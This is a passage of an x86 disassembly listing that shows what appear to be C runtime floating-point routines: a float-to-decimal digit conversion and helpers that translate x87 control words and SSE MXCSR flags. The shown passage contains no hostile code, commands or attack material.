                lea     eax, [ebp+eax+var_20]

loc_41DA22:                             ; CODE XREF: sub_41D4A9+5B7↓j
                mov     ecx, [ebp+var_48]
                movzx   edx, word ptr [eax]
                movzx   ecx, word ptr [ecx]
                and     [ebp+var_44], 0
                imul    ecx, edx
                mov     edx, [edi-4]
                lea     ebx, [edx+ecx]
                cmp     ebx, edx
                jb      short loc_41DA40
                cmp     ebx, ecx
                jnb     short loc_41DA47

loc_41DA40:                             ; CODE XREF: sub_41D4A9+591↑j
                mov     [ebp+var_44], 1

loc_41DA47:                             ; CODE XREF: sub_41D4A9+595↑j
                cmp     [ebp+var_44], 0
                mov     [edi-4], ebx
                jz      short loc_41DA53
                inc     word ptr [edi]

loc_41DA53:                             ; CODE XREF: sub_41D4A9+5A5↑j
                sub     [ebp+var_48], 2
                inc     eax
                inc     eax
                dec     [ebp+var_54]
                cmp     [ebp+var_54], 0
                jg      short loc_41DA22

loc_41DA62:                             ; CODE XREF: sub_41D4A9+56D↑j
                inc     edi
                inc     edi
                inc     [ebp+var_58]
                dec     [ebp+var_40]
                cmp     [ebp+var_40], 0
                jg      short loc_41DA09
                add     esi, 0C002h
                test    si, si
                jle     short loc_41DAB2

loc_41DA7B:                             ; CODE XREF: sub_41D4A9+602↓j
                mov     edi, [ebp+var_8]
                test    edi, edi
                js      short loc_41DAAD
                mov     eax, [ebp+var_C]
                mov     ecx, [ebp+var_10]
                shl     [ebp+var_10], 1
                mov     edx, eax
                add     eax, eax
                shr     ecx, 1Fh
                or      eax, ecx
                mov     [ebp+var_C], eax
                shr     edx, 1Fh
                lea     eax, [edi+edi]
                or      eax, edx
                add     esi, 0FFFFh
                mov     [ebp+var_8], eax
                test    si, si
                jg      short loc_41DA7B

loc_41DAAD:                             ; CODE XREF: sub_41D4A9+5D7↑j
                test    si, si
                jg      short loc_41DAFF

loc_41DAB2:                             ; CODE XREF: sub_41D4A9+5D0↑j
                add     esi, 0FFFFh
                test    si, si
                jge     short loc_41DAFF
                mov     eax, esi
                neg     eax
                movzx   eax, ax
                add     esi, eax

loc_41DAC6:                             ; CODE XREF: sub_41D4A9+64A↓j
                test    byte ptr [ebp+var_10], 1
                jz      short loc_41DACF
                inc     [ebp+var_50]

loc_41DACF:                             ; CODE XREF: sub_41D4A9+621↑j
                mov     ecx, [ebp+var_8]
                mov     edi, [ebp+var_C]
                mov     edx, [ebp+var_C]
                shr     [ebp+var_8], 1
                shl     ecx, 1Fh
                shr     edi, 1
                or      edi, ecx
                mov     ecx, [ebp+var_10]
                shl     edx, 1Fh
                shr     ecx, 1
                or      ecx, edx
                dec     eax
                mov     [ebp+var_C], edi
                mov     [ebp+var_10], ecx
                jnz     short loc_41DAC6
                cmp     [ebp+var_50], eax
                jz      short loc_41DAFF
                or      word ptr [ebp+var_10], 1

loc_41DAFF:                             ; CODE XREF: sub_41D4A9+607↑j
                                        ; sub_41D4A9+612↑j ...
                mov     eax, 8000h
                mov     ecx, eax
                cmp     word ptr [ebp+var_10], cx
                ja      short loc_41DB1D
                mov     ecx, [ebp+var_10]
                and     ecx, 1FFFFh
                cmp     ecx, 18000h
                jnz     short loc_41DB51

loc_41DB1D:                             ; CODE XREF: sub_41D4A9+661↑j
                cmp     [ebp+var_10+2], 0FFFFFFFFh
                jnz     short loc_41DB4E
                and     [ebp+var_10+2], 0
                cmp     [ebp+var_C+2], 0FFFFFFFFh
                jnz     short loc_41DB49
                and     [ebp+var_C+2], 0
                mov     ecx, 0FFFFh
                cmp     word ptr [ebp+var_8+2], cx
                jnz     short loc_41DB43
                mov     word ptr [ebp+var_8+2], ax
                inc     esi
                jmp     short loc_41DB51
; ---------------------------------------------------------------------------

loc_41DB43:                             ; CODE XREF: sub_41D4A9+691↑j
                inc     word ptr [ebp+var_8+2]
                jmp     short loc_41DB51
; ---------------------------------------------------------------------------

loc_41DB49:                             ; CODE XREF: sub_41D4A9+682↑j
                inc     [ebp+var_C+2]
                jmp     short loc_41DB51
; ---------------------------------------------------------------------------

loc_41DB4E:                             ; CODE XREF: sub_41D4A9+678↑j
                inc     [ebp+var_10+2]

loc_41DB51:                             ; CODE XREF: sub_41D4A9+672↑j
                                        ; sub_41D4A9+698↑j ...
                mov     eax, 7FFFh
                cmp     si, ax
                jb      short loc_41DB7E
                xor     eax, eax
                xor     ecx, ecx
                cmp     word ptr [ebp+var_5C], ax
                mov     [ebp-1Ch], eax
                setz    cl
                mov     [ebp+var_20], eax
                dec     ecx
                and     ecx, 80000000h
                add     ecx, 7FFF8000h
                mov     [ebp+var_1A+2], ecx
                jmp     short loc_41DBB9
; ---------------------------------------------------------------------------

loc_41DB7E:                             ; CODE XREF: sub_41D4A9+6B0↑j
                mov     ax, word ptr [ebp+var_10+2]
                or      esi, [ebp+var_5C]
                mov     word ptr [ebp+var_20], ax
                mov     eax, [ebp+var_C]
                mov     [ebp+var_20+2], eax
                mov     eax, [ebp+var_8]
                mov     [ebp+var_1A], eax
                mov     word ptr [ebp+var_16], si
                jmp     short loc_41DBB9
; ---------------------------------------------------------------------------

loc_41DB9B:                             ; CODE XREF: sub_41D4A9+4A0↑j
                                        ; sub_41D4A9+4A9↑j ...
                xor     eax, eax
                test    bx, bx
                setz    al
                and     dword ptr [ebp-1Ch], 0
                dec     eax
                and     eax, 80000000h
                add     eax, 7FFF8000h
                and     [ebp+var_20], 0

loc_41DBB6:                             ; CODE XREF: sub_41D4A9+4CF↑j
                mov     [ebp+var_1A+2], eax

loc_41DBB9:                             ; CODE XREF: sub_41D4A9+467↑j
                                        ; sub_41D4A9+531↑j ...
                test    [ebp+arg_10], 1
                mov     edx, [ebp+var_60]
                mov     eax, [ebp+var_4C]
                mov     edi, [ebp+arg_C]
                mov     [edx], ax
                jz      short loc_41DBFD
                cwde
                add     edi, eax
                test    edi, edi
                jg      short loc_41DBFD
                xor     eax, eax
                mov     [edx], ax
                mov     eax, 8000h
                cmp     word ptr [ebp+var_70], ax
                mov     byte ptr [edx+3], 1
                setnz   al
                dec     al
                and     al, 0Dh
                add     al, 20h
                mov     [edx+2], al
                mov     byte ptr [edx+4], 30h
                mov     byte ptr [edx+5], 0
                jmp     loc_41D55B
; ---------------------------------------------------------------------------

loc_41DBFD:                             ; CODE XREF: sub_41D4A9+720↑j
                                        ; sub_41D4A9+727↑j
                cmp     edi, 15h
                jle     short loc_41DC05
                push    15h
                pop     edi

loc_41DC05:                             ; CODE XREF: sub_41D4A9+757↑j
                mov     esi, [ebp+var_1A+2]
                shr     esi, 10h
                sub     esi, 3FFEh
                xor     eax, eax
                mov     word ptr [ebp+var_16], ax
                mov     [ebp+var_44], 8

loc_41DC1E:                             ; CODE XREF: sub_41D4A9+79B↓j
                mov     eax, [ebp+var_20]
                mov     ebx, [ebp-1Ch]
                mov     ecx, [ebp-1Ch]
                shl     [ebp+var_20], 1
                shr     eax, 1Fh
                add     ebx, ebx
                or      ebx, eax
                mov     eax, [ebp+var_1A+2]
                shr     ecx, 1Fh
                add     eax, eax
                or      eax, ecx
                dec     [ebp+var_44]
                mov     [ebp-1Ch], ebx
                mov     [ebp+var_1A+2], eax
                jnz     short loc_41DC1E
                test    esi, esi
                jge     short loc_41DC7C
                neg     esi
                and     esi, 0FFh
                jle     short loc_41DC7C

loc_41DC54:                             ; CODE XREF: sub_41D4A9+7D1↓j
                mov     eax, [ebp+var_1A+2]
                mov     ebx, [ebp-1Ch]
                mov     ecx, [ebp-1Ch]
                shr     [ebp+var_1A+2], 1
                shl     eax, 1Fh
                shr     ebx, 1
                or      ebx, eax
                mov     eax, [ebp+var_20]
                shl     ecx, 1Fh
                shr     eax, 1
                or      eax, ecx
                dec     esi
                mov     [ebp-1Ch], ebx
                mov     [ebp+var_20], eax
                test    esi, esi
                jg      short loc_41DC54

loc_41DC7C:                             ; CODE XREF: sub_41D4A9+79F↑j
                                        ; sub_41D4A9+7A9↑j
                lea     eax, [edi+1]
                lea     ebx, [edx+4]
                mov     [ebp+var_40], ebx
                mov     [ebp+var_4C], eax
                test    eax, eax
                jle     loc_41DD45

loc_41DC90:                             ; CODE XREF: sub_41D4A9+896↓j
                mov     edx, [ebp+var_20]
                mov     eax, [ebp-1Ch]
                lea     esi, [ebp+var_20]
                lea     edi, [ebp+var_3C]
                movsd
                movsd
                movsd
                shl     [ebp+var_20], 1
                mov     edi, [ebp+var_20]
                shl     [ebp+var_20], 1
                shr     edx, 1Fh
                lea     ecx, [eax+eax]
                or      ecx, edx
                mov     edx, [ebp+var_1A+2]
                mov     esi, eax
                shr     esi, 1Fh
                add     edx, edx
                or      edx, esi
                mov     eax, ecx
                lea     esi, [ecx+ecx]
                shr     eax, 1Fh
                lea     ecx, [edx+edx]
                mov     edx, [ebp+var_3C]
                shr     edi, 1Fh
                or      ecx, eax
                mov     eax, [ebp+var_20]
                or      esi, edi
                lea     edi, [edx+eax]
                cmp     edi, eax
                jb      short loc_41DCDF
                cmp     edi, edx
                jnb     short loc_41DCF7

loc_41DCDF:                             ; CODE XREF: sub_41D4A9+830↑j
                lea     eax, [esi+1]
                xor     edx, edx
                cmp     eax, esi
                jb      short loc_41DCED
                cmp     eax, 1
                jnb     short loc_41DCF0

loc_41DCED:                             ; CODE XREF: sub_41D4A9+83D↑j
                xor     edx, edx
                inc     edx

loc_41DCF0:                             ; CODE XREF: sub_41D4A9+842↑j
                mov     esi, eax
                test    edx, edx
                jz      short loc_41DCF7
                inc     ecx

loc_41DCF7:                             ; CODE XREF: sub_41D4A9+834↑j
                                        ; sub_41D4A9+84B↑j
                mov     eax, [ebp+var_38]
                lea     edx, [eax+esi]
                mov     [ebp+var_44], edx
                cmp     edx, esi
                jb      short loc_41DD08
                cmp     edx, eax
                jnb     short loc_41DD09

loc_41DD08:                             ; CODE XREF: sub_41D4A9+859↑j
                inc     ecx

loc_41DD09:                             ; CODE XREF: sub_41D4A9+85D↑j
                add     ecx, [ebp+var_34]
                shr     edx, 1Fh
                add     ecx, ecx
                or      ecx, edx
                lea     esi, [edi+edi]
                mov     [ebp+var_20], esi
                mov     esi, [ebp+var_44]
                mov     [ebp+var_1A+2], ecx
                shr     ecx, 18h
                add     esi, esi
                add     cl, 30h
                mov     eax, edi
                shr     eax, 1Fh
                or      esi, eax
                mov     [ebx], cl
                inc     ebx
                dec     [ebp+var_4C]
                cmp     [ebp+var_4C], 0
                mov     [ebp-1Ch], esi
                mov     byte ptr [ebp+var_16+1], 0
                jg      loc_41DC90

loc_41DD45:                             ; CODE XREF: sub_41D4A9+7E1↑j
                dec     ebx
                mov     al, [ebx]
                dec     ebx
                cmp     al, 35h
                jge     short loc_41DD5B
                mov     ecx, [ebp+var_40]
                jmp     short loc_41DD96
; ---------------------------------------------------------------------------

loc_41DD52:                             ; CODE XREF: sub_41D4A9+8B5↓j
                cmp     byte ptr [ebx], 39h
                jnz     short loc_41DD60
                mov     byte ptr [ebx], 30h
                dec     ebx

loc_41DD5B:                             ; CODE XREF: sub_41D4A9+8A2↑j
                cmp     ebx, [ebp+var_40]
                jnb     short loc_41DD52

loc_41DD60:                             ; CODE XREF: sub_41D4A9+8AC↑j
                mov     eax, [ebp+var_60]
                cmp     ebx, [ebp+var_40]
                jnb     short loc_41DD6C
                inc     ebx
                inc     word ptr [eax]

loc_41DD6C:                             ; CODE XREF: sub_41D4A9+8BD↑j
                inc     byte ptr [ebx]

loc_41DD6E:                             ; CODE XREF: sub_41D4A9+8F6↓j
                sub     bl, al
                sub     bl, 3
                movsx   ecx, bl
                mov     [eax+3], bl
                mov     byte ptr [ecx+eax+4], 0
                mov     eax, [ebp+var_74]

loc_41DD81:                             ; CODE XREF: sub_41D4A9+B5↑j
                                        ; sub_41D4A9+162↑j
                mov     ecx, [ebp+var_4]
                pop     edi
                pop     esi
                xor     ecx, ebp
                pop     ebx
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                leave
                retn
; ---------------------------------------------------------------------------

loc_41DD90:                             ; CODE XREF: sub_41D4A9+8EF↓j
                cmp     byte ptr [ebx], 30h
                jnz     short loc_41DD9A
                dec     ebx

loc_41DD96:                             ; CODE XREF: sub_41D4A9+8A7↑j
                cmp     ebx, ecx
                jnb     short loc_41DD90

loc_41DD9A:                             ; CODE XREF: sub_41D4A9+8EA↑j
                mov     eax, [ebp+var_60]
                cmp     ebx, ecx
                jnb     short loc_41DD6E
                xor     edx, edx
                mov     [eax], dx
                mov     edx, 8000h
                cmp     word ptr [ebp+var_70], dx
                mov     byte ptr [eax+3], 1
                setnz   dl
                dec     dl
                and     dl, 0Dh
                add     dl, 20h
                mov     [eax+2], dl
                mov     byte ptr [ecx], 30h
                mov     byte ptr [eax+5], 0
                jmp     loc_41D55B
sub_41D4A9      endp


; =============== S U B R O U T I N E =======================================


sub_41DDCD      proc near               ; CODE XREF: sub_41DEFB+C3↓p
                xor     eax, eax
                test    bl, 10h
                jz      short loc_41DDD5
                inc     eax

loc_41DDD5:                             ; CODE XREF: sub_41DDCD+5↑j
                test    bl, 8
                jz      short loc_41DDDD
                or      eax, 4

loc_41DDDD:                             ; CODE XREF: sub_41DDCD+B↑j
                test    bl, 4
                jz      short loc_41DDE5
                or      eax, 8

loc_41DDE5:                             ; CODE XREF: sub_41DDCD+13↑j
                test    bl, 2
                jz      short loc_41DDED
                or      eax, 10h

loc_41DDED:                             ; CODE XREF: sub_41DDCD+1B↑j
                test    bl, 1
                jz      short loc_41DDF5
                or      eax, 20h

loc_41DDF5:                             ; CODE XREF: sub_41DDCD+23↑j
                test    ebx, 80000h
                jz      short loc_41DE00
                or      eax, 2

loc_41DE00:                             ; CODE XREF: sub_41DDCD+2E↑j
                mov     ecx, ebx
                mov     edx, 300h
                and     ecx, edx
                push    esi
                mov     esi, 200h
                jz      short loc_41DE34
                cmp     ecx, 100h
                jz      short loc_41DE2F
                cmp     ecx, esi
                jz      short loc_41DE28
                cmp     ecx, edx
                jnz     short loc_41DE34
                or      eax, 0C00h
                jmp     short loc_41DE34
; ---------------------------------------------------------------------------

loc_41DE28:                             ; CODE XREF: sub_41DDCD+4E↑j
                or      eax, 800h
                jmp     short loc_41DE34
; ---------------------------------------------------------------------------

loc_41DE2F:                             ; CODE XREF: sub_41DDCD+4A↑j
                or      eax, 400h

loc_41DE34:                             ; CODE XREF: sub_41DDCD+42↑j
                                        ; sub_41DDCD+52↑j ...
                mov     ecx, ebx
                and     ecx, 30000h
                jz      short loc_41DE4A
                cmp     ecx, 10000h
                jnz     short loc_41DE4C
                or      eax, esi
                jmp     short loc_41DE4C
; ---------------------------------------------------------------------------

loc_41DE4A:                             ; CODE XREF: sub_41DDCD+6F↑j
                or      eax, edx

loc_41DE4C:                             ; CODE XREF: sub_41DDCD+77↑j
                                        ; sub_41DDCD+7B↑j
                pop     esi
                test    ebx, 40000h
                jz      short locret_41DE5A
                or      eax, 1000h

locret_41DE5A:                          ; CODE XREF: sub_41DDCD+86↑j
                retn
sub_41DDCD      endp


; =============== S U B R O U T I N E =======================================


sub_41DE5B      proc near               ; CODE XREF: sub_41DEFB:loc_41E140↓p
                xor     eax, eax
                test    dl, 10h
                jz      short loc_41DE67
                mov     eax, 80h

loc_41DE67:                             ; CODE XREF: sub_41DE5B+5↑j
                push    ebx
                push    esi
                push    edi
                mov     ebx, 200h
                test    dl, 8
                jz      short loc_41DE76
                or      eax, ebx

loc_41DE76:                             ; CODE XREF: sub_41DE5B+17↑j
                test    dl, 4
                jz      short loc_41DE80
                or      eax, 400h

loc_41DE80:                             ; CODE XREF: sub_41DE5B+1E↑j
                test    dl, 2
                jz      short loc_41DE8A
                or      eax, 800h

loc_41DE8A:                             ; CODE XREF: sub_41DE5B+28↑j
                test    dl, 1
                jz      short loc_41DE94
                or      eax, 1000h

loc_41DE94:                             ; CODE XREF: sub_41DE5B+32↑j
                mov     edi, 100h
                test    edx, 80000h
                jz      short loc_41DEA3
                or      eax, edi

loc_41DEA3:                             ; CODE XREF: sub_41DE5B+44↑j
                mov     ecx, edx
                mov     esi, 300h
                and     ecx, esi
                jz      short loc_41DECD
                cmp     ecx, edi
                jz      short loc_41DEC8
                cmp     ecx, ebx
                jz      short loc_41DEC1
                cmp     ecx, esi
                jnz     short loc_41DECD
                or      eax, 6000h
                jmp     short loc_41DECD
; ---------------------------------------------------------------------------

loc_41DEC1:                             ; CODE XREF: sub_41DE5B+59↑j
                or      eax, 4000h
                jmp     short loc_41DECD
; ---------------------------------------------------------------------------

loc_41DEC8:                             ; CODE XREF: sub_41DE5B+55↑j
                or      eax, 2000h

loc_41DECD:                             ; CODE XREF: sub_41DE5B+51↑j
                                        ; sub_41DE5B+5D↑j ...
                mov     ecx, 3000000h
                pop     edi
                and     edx, ecx
                pop     esi
                pop     ebx
                cmp     edx, 1000000h
                jz      short loc_41DEF5
                cmp     edx, 2000000h
                jz      short loc_41DEF1
                cmp     edx, ecx
                jnz     short locret_41DEFA
                or      eax, 8000h
                retn
; ---------------------------------------------------------------------------

loc_41DEF1:                             ; CODE XREF: sub_41DE5B+8A↑j
                or      eax, 40h
                retn
; ---------------------------------------------------------------------------

loc_41DEF5:                             ; CODE XREF: sub_41DE5B+82↑j
                or      eax, 8040h

locret_41DEFA:                          ; CODE XREF: sub_41DE5B+8E↑j
                retn
sub_41DE5B      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41DEFB      proc near               ; CODE XREF: sub_41D3FF+27↑p
                                        ; sub_41D3FF+57↑p ...

var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 14h
                push    ebx
                push    esi
                push    edi
                fstcw   word ptr [ebp+var_8]
                mov     ebx, [ebp+var_8]
                xor     edx, edx
                test    bl, 1
                jz      short loc_41DF17
                push    10h
                pop     edx

loc_41DF17:                             ; CODE XREF: sub_41DEFB+17↑j
                test    bl, 4
                jz      short loc_41DF1F
                or      edx, 8

loc_41DF1F:                             ; CODE XREF: sub_41DEFB+1F↑j
                test    bl, 8
                jz      short loc_41DF27
                or      edx, 4

loc_41DF27:                             ; CODE XREF: sub_41DEFB+27↑j
                test    bl, 10h
                jz      short loc_41DF2F
                or      edx, 2

loc_41DF2F:                             ; CODE XREF: sub_41DEFB+2F↑j
                test    bl, 20h
                jz      short loc_41DF37
                or      edx, 1

loc_41DF37:                             ; CODE XREF: sub_41DEFB+37↑j
                test    bl, 2
                jz      short loc_41DF42
                or      edx, 80000h

loc_41DF42:                             ; CODE XREF: sub_41DEFB+3F↑j
                movzx   ecx, bx
                mov     eax, ecx
                mov     esi, 0C00h
                and     eax, esi
                mov     edi, 300h
                jz      short loc_41DF79
                cmp     eax, 400h
                jz      short loc_41DF73
                cmp     eax, 800h
                jz      short loc_41DF6B
                cmp     eax, esi
                jnz     short loc_41DF79
                or      edx, edi
                jmp     short loc_41DF79
; ---------------------------------------------------------------------------

loc_41DF6B:                             ; CODE XREF: sub_41DEFB+66↑j
                or      edx, 200h
                jmp     short loc_41DF79
; ---------------------------------------------------------------------------

loc_41DF73:                             ; CODE XREF: sub_41DEFB+5F↑j
                or      edx, 100h

loc_41DF79:                             ; CODE XREF: sub_41DEFB+58↑j
                                        ; sub_41DEFB+6A↑j ...
                and     ecx, edi
                jz      short loc_41DF8D
                cmp     ecx, 200h
                jnz     short loc_41DF93
                or      edx, 10000h
                jmp     short loc_41DF93
; ---------------------------------------------------------------------------

loc_41DF8D:                             ; CODE XREF: sub_41DEFB+80↑j
                or      edx, 20000h

loc_41DF93:                             ; CODE XREF: sub_41DEFB+88↑j
                                        ; sub_41DEFB+90↑j
                test    ebx, 1000h
                jz      short loc_41DFA1
                or      edx, 40000h

loc_41DFA1:                             ; CODE XREF: sub_41DEFB+9E↑j
                mov     edi, [ebp+arg_4]
                mov     ecx, [ebp+arg_0]
                mov     eax, edi
                not     eax
                and     eax, edx
                and     ecx, edi
                or      eax, ecx
                mov     [ebp+arg_4], eax
                cmp     eax, edx
                jz      loc_41E06A
                mov     ebx, eax
                call    sub_41DDCD
                movzx   eax, ax
                mov     [ebp+var_4], eax
                fldcw   word ptr [ebp+var_4]
                fstcw   word ptr [ebp+var_4]
                mov     ebx, [ebp+var_4]
                xor     edx, edx
                test    bl, 1
                jz      short loc_41DFDD
                push    10h
                pop     edx

loc_41DFDD:                             ; CODE XREF: sub_41DEFB+DD↑j
                test    bl, 4
                jz      short loc_41DFE5
                or      edx, 8

loc_41DFE5:                             ; CODE XREF: sub_41DEFB+E5↑j
                test    bl, 8
                jz      short loc_41DFED
                or      edx, 4

loc_41DFED:                             ; CODE XREF: sub_41DEFB+ED↑j
                test    bl, 10h
                jz      short loc_41DFF5
                or      edx, 2

loc_41DFF5:                             ; CODE XREF: sub_41DEFB+F5↑j
                test    bl, 20h
                jz      short loc_41DFFD
                or      edx, 1

loc_41DFFD:                             ; CODE XREF: sub_41DEFB+FD↑j
                test    bl, 2
                jz      short loc_41E008
                or      edx, 80000h

loc_41E008:                             ; CODE XREF: sub_41DEFB+105↑j
                movzx   ecx, bx
                mov     eax, ecx
                and     eax, esi
                jz      short loc_41E039
                cmp     eax, 400h
                jz      short loc_41E033
                cmp     eax, 800h
                jz      short loc_41E02B
                cmp     eax, esi
                jnz     short loc_41E039
                or      edx, 300h
                jmp     short loc_41E039
; ---------------------------------------------------------------------------

loc_41E02B:                             ; CODE XREF: sub_41DEFB+122↑j
                or      edx, 200h
                jmp     short loc_41E039
; ---------------------------------------------------------------------------

loc_41E033:                             ; CODE XREF: sub_41DEFB+11B↑j
                or      edx, 100h

loc_41E039:                             ; CODE XREF: sub_41DEFB+114↑j
                                        ; sub_41DEFB+126↑j ...
                and     ecx, 300h
                jz      short loc_41E051
                cmp     ecx, 200h
                jnz     short loc_41E057
                or      edx, 10000h
                jmp     short loc_41E057
; ---------------------------------------------------------------------------

loc_41E051:                             ; CODE XREF: sub_41DEFB+144↑j
                or      edx, 20000h

loc_41E057:                             ; CODE XREF: sub_41DEFB+14C↑j
                                        ; sub_41DEFB+154↑j
                test    ebx, 1000h
                jz      short loc_41E065
                or      edx, 40000h

loc_41E065:                             ; CODE XREF: sub_41DEFB+162↑j
                mov     [ebp+arg_4], edx
                mov     eax, edx

loc_41E06A:                             ; CODE XREF: sub_41DEFB+BB↑j
                xor     esi, esi
                cmp     dword_42C9EC, esi
                jz      loc_41E205
                and     edi, 308031Fh
                mov     [ebp+var_14], edi
                stmxcsr [ebp+var_10]
                mov     eax, [ebp+var_10]
                test    al, al
                jns     short loc_41E08F
                push    10h
                pop     esi

loc_41E08F:                             ; CODE XREF: sub_41DEFB+18F↑j
                test    eax, 200h
                jz      short loc_41E099
                or      esi, 8

loc_41E099:                             ; CODE XREF: sub_41DEFB+199↑j
                test    eax, 400h
                jz      short loc_41E0A3
                or      esi, 4

loc_41E0A3:                             ; CODE XREF: sub_41DEFB+1A3↑j
                test    eax, 800h
                jz      short loc_41E0AD
                or      esi, 2

loc_41E0AD:                             ; CODE XREF: sub_41DEFB+1AD↑j
                test    eax, 1000h
                jz      short loc_41E0B7
                or      esi, 1

loc_41E0B7:                             ; CODE XREF: sub_41DEFB+1B7↑j
                test    eax, 100h
                jz      short loc_41E0C4
                or      esi, 80000h

loc_41E0C4:                             ; CODE XREF: sub_41DEFB+1C1↑j
                mov     ecx, eax
                mov     ebx, 6000h
                and     ecx, ebx
                jz      short loc_41E0F9
                cmp     ecx, 2000h
                jz      short loc_41E0F3
                cmp     ecx, 4000h
                jz      short loc_41E0EB
                cmp     ecx, ebx
                jnz     short loc_41E0F9
                or      esi, 300h
                jmp     short loc_41E0F9
; ---------------------------------------------------------------------------

loc_41E0EB:                             ; CODE XREF: sub_41DEFB+1E2↑j
                or      esi, 200h
                jmp     short loc_41E0F9
; ---------------------------------------------------------------------------

loc_41E0F3:                             ; CODE XREF: sub_41DEFB+1DA↑j
                or      esi, 100h

loc_41E0F9:                             ; CODE XREF: sub_41DEFB+1D2↑j
                                        ; sub_41DEFB+1E6↑j ...
                mov     edi, 8040h
                and     eax, edi
                sub     eax, 40h
                jz      short loc_41E121
                sub     eax, 7FC0h
                jz      short loc_41E119
                sub     eax, 40h
                jnz     short loc_41E127
                or      esi, 1000000h
                jmp     short loc_41E127
; ---------------------------------------------------------------------------

loc_41E119:                             ; CODE XREF: sub_41DEFB+20F↑j
                or      esi, 3000000h
                jmp     short loc_41E127
; ---------------------------------------------------------------------------

loc_41E121:                             ; CODE XREF: sub_41DEFB+208↑j
                or      esi, 2000000h

loc_41E127:                             ; CODE XREF: sub_41DEFB+214↑j
                                        ; sub_41DEFB+21C↑j ...
                mov     eax, [ebp+var_14]
                mov     edx, eax
                and     eax, [ebp+arg_0]
                not     edx
                and     edx, esi
                or      edx, eax
                cmp     edx, esi
                jnz     short loc_41E140
                mov     eax, esi
                jmp     loc_41E1F0
; ---------------------------------------------------------------------------

loc_41E140:                             ; CODE XREF: sub_41DEFB+23C↑j
                call    sub_41DE5B
                push    eax
                mov     [ebp+var_C], eax
                call    sub_41E20A
                pop     ecx
                stmxcsr [ebp+var_C]
                mov     ecx, [ebp+var_C]
                xor     edx, edx
                test    cl, cl
                jns     short loc_41E15F
                push    10h
                pop     edx

loc_41E15F:                             ; CODE XREF: sub_41DEFB+25F↑j
                test    ecx, 200h
                jz      short loc_41E16A
                or      edx, 8

loc_41E16A:                             ; CODE XREF: sub_41DEFB+26A↑j
                test    ecx, 400h
                jz      short loc_41E175
                or      edx, 4

loc_41E175:                             ; CODE XREF: sub_41DEFB+275↑j
                test    ecx, 800h
                jz      short loc_41E180
                or      edx, 2

loc_41E180:                             ; CODE XREF: sub_41DEFB+280↑j
                test    ecx, 1000h
                jz      short loc_41E18B
                or      edx, 1

loc_41E18B:                             ; CODE XREF: sub_41DEFB+28B↑j
                mov     esi, 100h
                test    esi, ecx
                jz      short loc_41E19A
                or      edx, 80000h

loc_41E19A:                             ; CODE XREF: sub_41DEFB+297↑j
                mov     eax, ecx
                and     eax, ebx
                jz      short loc_41E1C4
                cmp     eax, 2000h
                jz      short loc_41E1C2
                cmp     eax, 4000h
                jz      short loc_41E1BA
                cmp     eax, ebx
                jnz     short loc_41E1C4
                or      edx, 300h
                jmp     short loc_41E1C4
; ---------------------------------------------------------------------------

loc_41E1BA:                             ; CODE XREF: sub_41DEFB+2B1↑j
                or      edx, 200h
                jmp     short loc_41E1C4
; ---------------------------------------------------------------------------

loc_41E1C2:                             ; CODE XREF: sub_41DEFB+2AA↑j
                or      edx, esi

loc_41E1C4:                             ; CODE XREF: sub_41DEFB+2A3↑j
                                        ; sub_41DEFB+2B5↑j ...
                and     ecx, edi
                sub     ecx, 40h
                jz      short loc_41E1E8
                sub     ecx, 7FC0h
                jz      short loc_41E1E0
                sub     ecx, 40h
                jnz     short loc_41E1EE
                or      edx, 1000000h
                jmp     short loc_41E1EE
; ---------------------------------------------------------------------------

loc_41E1E0:                             ; CODE XREF: sub_41DEFB+2D6↑j
                or      edx, 3000000h
                jmp     short loc_41E1EE
; ---------------------------------------------------------------------------

loc_41E1E8:                             ; CODE XREF: sub_41DEFB+2CE↑j
                or      edx, 2000000h

loc_41E1EE:                             ; CODE XREF: sub_41DEFB+2DB↑j
                                        ; sub_41DEFB+2E3↑j ...
                mov     eax, edx

loc_41E1F0:                             ; CODE XREF: sub_41DEFB+240↑j
                mov     ecx, eax
                xor     ecx, [ebp+arg_4]
                or      eax, [ebp+arg_4]
                test    ecx, 8031Fh
                jz      short loc_41E205
                or      eax, 80000000h

loc_41E205:                             ; CODE XREF: sub_41DEFB+177↑j
                                        ; sub_41DEFB+303↑j
                pop     edi
                pop     esi
                pop     ebx
                leave
                retn
sub_41DEFB      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41E20A      proc near               ; CODE XREF: sub_41DEFB+24E↑p

ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8

                push    8
                push    offset stru_423288
                call    __SEH_prolog4
                xor     eax, eax
                cmp     dword_42C9EC, eax
                jz      short loc_41E276
                test    byte ptr [ebp+arg_0], 40h
                jz      short loc_41E26E
                cmp     dword_426370, eax
                jz      short loc_41E26E
                mov     [ebp+ms_exc.registration.TryLevel], eax
                ldmxcsr [ebp+arg_0]
                jmp     short loc_41E265
; ---------------------------------------------------------------------------

loc_41E237:                             ; DATA XREF: .rdata:stru_423288↓o
                mov     eax, [ebp+ms_exc.exc_ptr]
                mov     eax, [eax]
                mov     eax, [eax]
                cmp     eax, 0C0000005h
                jz      short loc_41E24F
                cmp     eax, 0C000001Dh
                jz      short loc_41E24F
                xor     eax, eax
                retn
; ---------------------------------------------------------------------------

loc_41E24F:                             ; CODE XREF: sub_41E20A+39↑j
                                        ; sub_41E20A+40↑j
                xor     eax, eax
                inc     eax
                retn
; ---------------------------------------------------------------------------

loc_41E253:                             ; DATA XREF: .rdata:stru_423288↓o
                mov     esp, [ebp+ms_exc.old_esp]
                and     dword_426370, 0
                and     [ebp+arg_0], 0FFFFFFBFh
                ldmxcsr [ebp+arg_0]

loc_41E265:                             ; CODE XREF: sub_41E20A+2B↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                jmp     short loc_41E276
; ---------------------------------------------------------------------------

loc_41E26E:                             ; CODE XREF: sub_41E20A+1A↑j
                                        ; sub_41E20A+22↑j
                and     [ebp+arg_0], 0FFFFFFBFh
                ldmxcsr [ebp+arg_0]

loc_41E276:                             ; CODE XREF: sub_41E20A+14↑j
                                        ; sub_41E20A+62↑j
                call    __SEH_epilog4
                retn
sub_41E20A      endp

; ---------------------------------------------------------------------------
                align 10h

